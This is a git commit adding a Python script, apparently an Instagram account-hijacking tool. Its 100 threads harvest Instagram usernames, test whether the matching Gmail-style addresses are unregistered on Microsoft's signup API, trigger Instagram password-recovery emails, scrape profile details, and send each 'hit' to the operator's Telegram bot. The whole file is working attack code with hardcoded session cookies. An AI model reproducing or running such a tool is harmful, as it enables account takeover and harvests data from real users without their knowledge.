d5ffabf370955b81e77f9565ee96710f139e2ecb
razapython <razamemon668@gmail.com>
2025-04-17 00:05:05 +0530

    Raza free openn

---
+++ Raza free open source.py
@@ -0,0 +1,535 @@
+print(('\033[92m~'*40)+'\n| [↯] 𝐖𝐀𝐈𝐓 𝐅𝐎𝐑 𝐓𝐇𝐄 𝐓𝐎𝐎𝐋𝐒 𝐓𝐎 𝐑𝐔𝐍 - انتظر ليتم تشغيل الادات |\n'+('~'*40))
+import os,requests,json,time
+import re,random,sys,uuid,string,subprocess,webbrowser
+from concurrent.futures import ThreadPoolExecutor as ThreadPool
+import time
+import sys
+import os
+import random
+BR = '\x1b[38;5;208m'
+AH2 = '\x1b[38;5;204m' 
+AS2 = '\x1b[38;5;220m'
+MJ = '\x1b[38;5;193m'
+MJ2 = '\x1b[38;5;216m'
+MJ3 = '\x1b[38;5;190m'
+MJ4 = '\x1b[38;5;106m'
+ma = '\x1b[38;5;26m'
+colors = [BR, AH2, AS2, MJ, MJ2, MJ3, MJ4, ma]
+random_color = random.choice(colors)
+def heroess():
+    anim = ["[\x1b[1;91m■\x1b[0m□□□□□□□□□]","[\x1b[1;92m■■\x1b[0m□□□□□□□□]", "[\x1b[1;93m■■■\x1b[0m□□□□□□□]", "[\x1b[1;95m■■■■\x1b[0m□□□□□□]", "[\x1b[1;94m■■■■■\x1b[0m□□□□□]", "[\x1b[38;5;26m■■■■■■\x1b[0m□□□□]", "[\x1b[1;96m■■■■■■■\x1b[0m□□□]", "[\x1b[38;5;86m■■■■■■■■\x1b[0m□□]", "[\x1b[38;5;96m■■■■■■■■■\x1b[0m□]", "[\x1b[38;5;203m■■■■■■■■■■\x1b[0m]"]
+    am = ('\x1b[38;5;203m','\x1b[38;5;203m','\x1b[38;5;203m','\x1b[38;5;203m','\x1b[38;5;203m','\x1b[38;5;203m')
+    for i in range(50):
+        time.sleep(.1)
+        os.system('clear')
+        sys.stdout.write(f"\r {random_color} " + anim[i % len(anim)] +"\x1b[0m ")
+        sys.stdout.write(f"\r {random_color}" + am[i % len(am)] +"\x1b[0m ")
+        sys.stdout.flush()
+heroess()
+oks = []
+user_ID = []
+cps = []
+cracked = []
+pwx = []
+ualist = []
+def ua_api():
+    vers = random.randrange(6,13)
+    verq = random.choice(["RMX3472", "RMX3611", "RMX3396", "RMX3572", "RMX3706", "RMX3396", "RMX3610", "RMX3371", "RMX3572", "RMX3461", "RMX3311", "RMX3563", "RMX3371", "RMX3269", "RMX3370", "RMX3574", "RMX3661", "RMX3611"])
+os.system('clear')
+import webbrowser
+webbrowser.open('https://t.me/razapython')
+#pylint:disable=E0001
+foo = False
+if foo:
+    bar = 1 / 0
+from datetime import datetime
+current_time = datetime.now()
+expiry_time = datetime.strptime('2029-1-1 00:00:00.000', '%Y-%m-%d %H:%M:%S.%f')
+if current_time > expiry_time:
+       print('وس 🏁')
+       exit(0)
+
+import os
+
+try:
+	import random
+	
+	import sys
+	
+	import requests
+	
+	import time
+	
+	from threading import Thread
+	
+	from user_agent import generate_user_agent
+	
+	import threading
+	
+	from cfonts import render
+	
+	from ms4 import UserAgentGenerator
+	
+	from random import randrange
+	
+	import pyfiglet
+	
+	import secrets
+	
+	import string
+	
+	import uuid
+	
+	from ms4 import Instagram
+	
+except ImportError:
+	
+	os.system('pip install random')
+	
+	os.system('pip install requests')
+	
+	os.system('pip install time')
+	
+	os.system('pip install pyfiglet')
+	
+	os.system('pip install uuid')
+	
+	os.system('pip install string')
+	
+	os.system('pip install pyflglet')
+	
+	os.system('pip install secrets')
+	
+	os.system('pip install threading')
+	
+	os.system('pip install user_agent')
+	
+	os.system('pip install python-cfonts')
+	
+	os.system('pip install ms4')
+	
+	os.system('clear')
+	
+	
+
+host=''.join(random.choice("qwerytuiopasdfghjklzxcvbnm")for i in range(random.randrange(15,30)))
+
+ua = str(generate_user_agent())
+
+uid = str(uuid.uuid4())
+
+
+
+R = "\033[1;31m" #احمر
+G = "\033[1;32m" #اخضر
+Y = "\033[1;33m" #اصفر
+B = "\033[1;34m" #ازرق
+rest = "\033[0m" #استرجاع اللون الى الون الصلي
+R = '\033[1;31m' #احمر
+X = '\033[1;33m' #اصفر
+F = '\033[2;32m' #اخضر
+C = "\033[1;97m" #ابيض
+B = '\033[2;36m'#سمائي
+Y = '\033[1;34m' #ازرق فاتح.
+E = '\033[1;31m'
+B = '\033[2;36m'
+G = '\033[1;32m'
+S = '\033[1;33m'
+SA = '\x1b[38;5;216m'
+S2A = '\x1b[1;36m'
+S3A = '\x1b[38;5;180m'
+S4A= '\x1b[38;5;88m' 
+S5A = "\x1b[1;32m" 
+S6A= '\x1b[38;5;166m'
+K = '\033[2;35m'
+a1='\x1b[38;5;161m'#وردي جميل جدا
+a1 = '\x1b[1;31m'  # أحمر
+a2 = '\x1b[1;34m'  # أزرق
+a3 = '\x1b[1;32m'  # أخضر
+a4 = '\x1b[1;33m'  # أصفر
+a5 = '\x1b[38;5;208m'  # برتقالي
+a6 = '\x1b[38;5;5m'  # أرجواني
+a7 = '\x1b[38;5;13m'  # وردي
+a8 = '\x1b[1;30m'  # أسود
+a9 = '\x1b[1;37m'  # أبيض
+a10 = '\x1b[38;5;52m'  # بني
+a11 = '\x1b[38;5;8m'  # رمادي
+a12 = '\x1b[38;5;220m'  # ذهبي
+a13 = '\x1b[38;5;7m'  # فضي
+a14 = '\x1b[38;5;153m'  # أزرق فاتح
+a15 = '\x1b[38;5;18m'  # أزرق داكن
+a16 = '\x1b[38;5;48m'  # أخضر فاتح
+a17 = '\x1b[38;5;22m'  # أخضر داكن
+a18 = '\x1b[38;5;196m'  # أحمر فاتح
+a19 = '\x1b[38;5;88m'  # أحمر داكن
+a20 = '\x1b[38;5;226m'  # أصفر فاتح
+a21 = '\x1b[38;5;136m'  # أصفر داكن
+a22 = '\x1b[38;5;216m'  # برتقالي فات
+a23 = '\x1b[38;5;166m'  # برتقالي داكن
+a24 = '\x1b[38;5;234m'  # أرجواني فاتح
+a25 = '\x1b[38;5;91m'  # أرجواني داكن
+a26 = '\x1b[38;5;205m'  # وردي فاتح
+a27 = '\x1b[38;5;161m'  # وردي داكن
+a28 = '\x1b[38;5;236m'  # أسود فاتح
+a29 = '\x1b[38;5;233m'  # أسود داكن
+a30 = '\x1b[38;5;255m'  # أبيض فاتح
+a31 = '\x1b[38;5;231m'  # أبيض داكن
+a32 = '\x1b[38;5;180m'  # بني فاتح
+a33 = '\x1b[38;5;94m'  # بني داكن
+a34 = '\x1b[38;5;252m'  # رمادي فاتح
+a35 = '\x1b[38;5;246m'  # رمادي داكن
+a36 = '\x1b[38;5;228m'  # ذهبي فاتح
+a37 = '\x1b[38;5;172m'  # ذهبي داكن
+a38 = '\x1b[38;5;188m'  # فضي فاتح
+a39 = '\x1b[38;5;247m'  # فضي داكن
+a40 = '\x1b[38;5;117m'  # أزرق سماوي
+
+#########################
+
+q=0
+w=0
+e=0
+r=0
+ids=[]
+
+########################
+
+
+print(render("RAZA ", colors=["red","blue"]))
+
+
+token = input(a23+'\n ENTER TOKEN:')
+
+print(a13+'°'*15)
+
+ID = input(a16+' ENTER CHAT ID : ')
+os.system('clear')
+
+
+def checker(email):
+	global q,w,e,r
+	
+	user = email.split('@')[0]
+	
+	url = 'https://signup.live.com'
+	re = requests.get(url)
+	amsc = re.cookies.get_dict().get('amsc')
+	canary = re.text.split('"apiCanary":"')[1].split('"')[0].encode().decode('unicode_escape')
+
+	while True:
+		try:
+			
+			cookies = {
+			    'amsc': amsc
+			}
+			
+			headers = {
+			    'canary': canary,
+			    'origin': 'https://signup.live.com',
+			    'referer': 'https://signup.live.com/?lic=1',
+			    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36',
+			}
+			
+			json_data = {
+			    'clientExperiments': [
+			        {
+			            'parallax': 'enablejspublickeydeprecationexperiment',
+			            'control': 'enablejspublickeydeprecationexperiment_control',
+			            'treatments': [
+			                'enablejspublickeydeprecationexperiment_treatment',
+			            ],
+			        },
+			    ],
+			}
+			
+			response = requests.post(
+			    'https://signup.live.com/API/EvaluateExperimentAssignments',
+			    cookies=cookies,
+			    headers=headers,
+			    json=json_data,
+			).json()
+			
+			canary = response['apiCanary']
+			
+			break
+		
+		except:
+			
+			pass
+			
+	cookies = {
+	    'amsc': amsc
+	}
+	
+	headers = {
+	    'canary': canary,
+	    'origin': 'https://signup.live.com',
+	    'referer': 'https://signup.live.com/?lic=1',
+	    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36',
+	}
+	
+	json_data = {
+	    'signInName': email,
+	}
+	
+	res = requests.post(
+	    'https://signup.live.com/API/CheckAvailableSigninNames',
+	    cookies=cookies,
+	    headers=headers,
+	    json=json_data,
+	).text
+	
+	if '"isAvailable":true' in res:
+		q+=1
+		os.system('cls' if os.name == 'nt' else 'clear')
+		print(f'''— — — — — — — 
+OK ==> {w}
+CP ==> {q}
+[ 🦈 ] ==> {e}
+[ 🦈 ] ==> {r}
+EMIL ==> {email}
+{a6} ➥ RAZA 
+— — — — — — — 
+''')
+		ins= Instagram.CheckInsta(email)['Is_Available']
+		if ins == 'true':
+			w+=1
+			os.system('cls' if os.name == 'nt' else 'clear')
+			print(f'''— — — — — — — 
+[ 🦈 ] ==> {w}
+[ 🦈 ] ==> {q}
+[ 🦈 ] ==> {e}
+[ 🦈 ] ==> {r}
+[ 🦈 ] ==> {email}
+{a6} ➥ RAZA 
+— — — — — — — 
+''')
+			
+			headers = {
+            'X-Pigeon-Session-Id': '50cc6861-7036-43b4-802e-fb4282799c60',
+            'X-Pigeon-Rawclienttime': '1700251574.982',
+            'X-IG-Connection-Speed': '-1kbps',
+            'X-IG-Bandwidth-Speed-KBPS': '-1.000',
+            'X-IG-Bandwidth-TotalBytes-B': '0',
+            'X-IG-Bandwidth-TotalTime-MS': '0',
+            'X-Bloks-Version-Id': '009f03b18280bb343b0862d663f31ac80c5fb30dfae9e273e43c63f13a9f31c0',
+            'X-IG-Connection-Type': 'WIFI',
+            'X-IG-Capabilities': '3brTvw==',
+            'X-IG-App-ID': '567067343352427',
+            'User-Agent': 'Instagram 100.0.0.17.129 Android (29/10; 420dpi; 1080x2129; samsung; SM-M205F; m20lte; exynos7904; en_GB; 161478664)',
+            'Accept-Language': 'en-GB, en-US',
+             'Cookie': 'mid=ZVfGvgABAAGoQqa7AY3mgoYBV1nP; csrftoken=9y3N5kLqzialQA7z96AMiyAKLMBWpqVj',
+            'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
+            'Accept-Encoding': 'gzip, deflate',
+            'Host': 'i.instagram.com',
+            'X-FB-HTTP-Engine': 'Liger',
+            'Connection': 'keep-alive',
+            'Content-Length': '356',
+        }
+			data = {
+            'signed_body': '0d067c2f86cac2c17d655631c9cec2402012fb0a329bcafb3b1f4c0bb56b1f1f.{"_csrftoken":"9y3N5kLqzialQA7z96AMiyAKLMBWpqVj","adid":"0dfaf820-2748-4634-9365-c3d8c8011256","guid":"1f784431-2663-4db9-b624-86bd9ce1d084","device_id":"android-b93ddb37e983481c","query":"'+user+'"}',
+            'ig_sig_key_version': '4',
+        }
+			reso = requests.post('https://i.instagram.com/api/v1/accounts/send_recovery_flow_email/',headers=headers,data=data,)
+			
+			cookies = {
+			    'ig_did': '1DE3A5D0-A9E6-41AE-A389-ED36F72A90CF',
+			    'ig_nrcb': '1',
+			    'mid': 'ZrQhnAABAAGBdscjjB-Fb3_pcDhQ',
+			    'datr': 'nCG0Zucex87H44J0VQJbhvIe',
+			    'fbm_124024574287414': 'base_domain=.instagram.com',
+			    'dpr': '3.2983407974243164',
+			    'ps_l': '1',
+			    'ps_n': '1',
+			    'csrftoken': 'g8gnoPZQPjPnN6ozxUZ26LcRG2RQc9v1',
+			    'wd': '891x1703',
+			}
+			
+			headers = {
+			    'authority': 'www.instagram.com',
+			    'accept': '*/*',
+			    'accept-language': 'ar-IQ,ar;q=0.9,en-US;q=0.8,en;q=0.7',
+			    'referer': 'https://www.instagram.com/c.s3y/',
+			    'sec-ch-prefers-color-scheme': 'dark',
+			    'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
+			    'sec-ch-ua-full-version-list': '"Not-A.Brand";v="99.0.0.0", "Chromium";v="124.0.6327.4"',
+			    'sec-ch-ua-mobile': '?0',
+			    'sec-ch-ua-model': '""',
+			    'sec-ch-ua-platform': '"Linux"',
+			    'sec-ch-ua-platform-version': '""',
+			    'sec-fetch-dest': 'empty',
+			    'sec-fetch-mode': 'cors',
+			    'sec-fetch-site': 'same-origin',
+			    'user-agent': ua,
+			    'x-asbd-id': '129477',
+			    'x-csrftoken': 'g8gnoPZQPjPnN6ozxUZ26LcRG2RQc9v1',
+			    'x-ig-app-id': '936619743392459',
+			    'x-ig-www-claim': '0',
+			    'x-requested-with': 'XMLHttpRequest',
+			}
+			
+			params = {
+			    'username': user,
+			}
+			
+			response = requests.get(
+			    'https://www.instagram.com/api/v1/users/web_profile_info/',
+			    params=params,
+			    cookies=cookies,
+			    headers=headers,
+			).json()
+			try:
+				name = response['data']['user']['full_name']
+			except:
+				name = None
+			try:
+				fols = response['data']['user']['edge_followed_by']['count']
+			except:
+				fols = None
+			try:
+				folg = response['data']['user']['edge_follow']['count']
+			except:
+				folg = None
+			try:
+				id = response['data']['user']['id']
+			except:
+				Id = None
+			try:
+				pr = response['data']['user']['is_private']
+			except:
+				pr = None
+			try:
+				bio = response['data']['user']['biography']
+			except:
+				bio = None
+			try:
+				post = response['data']['user']['edge_owner_to_timeline_media']['count']
+			except:
+				post = None
+			try:
+				resst = reso.json()['email']
+			except:
+				resst = None
+			try:
+				date = requests.get(f"https://o7aa.pythonanywhere.com/?id={Id}").json()['date']
+			except:
+				data = None
+			
+			tlg = (f'''
+[↯] 𝐀𝐍 𝐀𝐕𝐀𝐈𝐋𝐀𝐁𝐋𝐄 𝐈𝐍𝐒𝐓𝐀 𝐀𝐂𝐂𝐎𝐔𝐍𝐓 𝐇𝐀𝐒 𝐁𝐄𝐄𝐍 𝐖𝐈𝐓𝐇𝐃𝐑𝐀𝐖𝐍 - تم سحب متاح الانستغرام  [ 💠 ]
+°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°
+💎ғᴜʟʟ_ɴᴀᴍᴇ • {name}
+
+💎ᴜѕᴇʀ • {user}
+
+💎ᴇᴍᴀɪʟ • {email}
+
+💎ғᴏʟʟᴏᴡᴇʀѕ  • {fols}
+
+💎ғᴏʟʟᴏᴡɪɴɢ • {folg}
+
+💎ʙɪᴏ • {bio}
+
+💎ᴘᴏѕᴛ • {post}
+
+💎ʀᴇѕᴛ • {resst}
+
+💎ᴅᴀᴛᴀ • {data}
+
+💎ᴘʀɪᴠᴀᴛᴇ • {pr}
+
+💎ᴜʀʟ • https://www.instagram.com/{user}
+°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°
+[ ☘️ ] ➥RAZA 
+
+
+''')
+			
+			print(tlg)				
+			requests.post(f"https://api.telegram.org/bot{token}/sendMessage?chat_id={ID}&text={tlg}")
+			
+			with open('hits.txt', 'a') as tix:
+				tix.write(f'{tlg}')
+		else:
+			e+=1
+			os.system('cls' if os.name == 'nt' else 'clear')
+			print(f'''— — — — — — — 
+[ 🦈 ] ==> {w}
+[ 🦈 ] ==> {q}
+[ 🦈 ] ==> {e}
+[ 🦈 ] ==> {r}
+[ 🦈 ] ==> {email}
+{a6} ➥  @RAZAPLUGS @Ry0uk
+— — — — — — — 
+''')
+			
+	else:
+		r+=1
+		os.system('cls' if os.name == 'nt' else 'clear')
+		print(f'''— — — — — — — 
+[ 🦈 ] ==> {w}
+[ 🦈 ] ==> {q}
+[ 🦈 ] ==> {e}
+[ 🦈 ] ==> {r}
+[ 🦈 ] ==> {email}
+{a6} ➥ RAZA
+— — — — — — — 
+''')
+	
+
+
+def rand_ids():  
+  Id= str(random.randrange(279760000,3713668786))
+  if Id not in ids:
+    ids.append(Id)
+    return Id
+  else:
+    rand_ids()
+ 
+    
+    
+def gen():
+  global check
+  try:
+    while True:      
+      rnd=str(random.randint(150, 999))
+      user_agent = "Instagram 311.0.0.32.118 Android (" + ["23/6.0", "24/7.0", "25/7.1.1", "26/8.0", "27/8.1", "28/9.0"][random.randint(0, 5)] + "; " + str(random.randint(100, 1300)) + "dpi; " + str(random.randint(200, 2000)) + "x" + str(random.randint(200, 2000)) + "; " + ["SAMSUNG", "HUAWEI", "LGE/lge", "HTC", "ASUS", "ZTE", "ONEPLUS", "XIAOMI", "OPPO", "VIVO", "SONY", "REALME"][random.randint(0, 11)] + "; SM-T" + rnd + "; SM-T" + rnd + "; qcom; en_US; 545986"+str(random.randint(111,999))+")"
+      Id = rand_ids()
+      lsd=''.join(random.choice('azertyuiopmlkjhgfdsqwxcvbnAZERTYUIOPMLKJHGFDSQWXCVBN1234567890') for _ in range(32))
+      headers = {
+    'accept': '*/*',
+    'accept-language': 'en,en-US;q=0.9',
+    'content-type': 'application/x-www-form-urlencoded',
+    'dnt': '1',
+    'origin': 'https://www.instagram.com',
+    'priority': 'u=1, i',
+    'referer': 'https://www.instagram.com/cristiano/following/',
+    'user-agent': user_agent,
+    'x-fb-friendly-name': 'PolarisUserHoverCardContentV2Query',
+    'x-fb-lsd': lsd,
+}
+      data = {
+    'lsd': lsd,
+    'fb_api_caller_class': 'RelayModern',
+    'fb_api_req_friendly_name': 'PolarisUserHoverCardContentV2Query',
+    'variables': '{"userID":"'+str(Id)+'","username":"cristiano"}',
+    'server_timestamps': 'true',
+    'doc_id': '7717269488336001',
+}
+      response = requests.post('https://www.instagram.com/api/graphql', headers=headers, data=data)
+      user =response.json()['data']['user']['username']
+      email = user + '@gmail.com' 
+      checker(email)
+  except:
+  	gen()
+
+
+if __name__ == '__main__':
+ 
+ Thread = []
+ for i in range(100):
+ 	t = threading.Thread(target=gen)
+ 	Thread.append(t)
+ 	t.start()
+ for th in Thread:
+ 	th.join()	
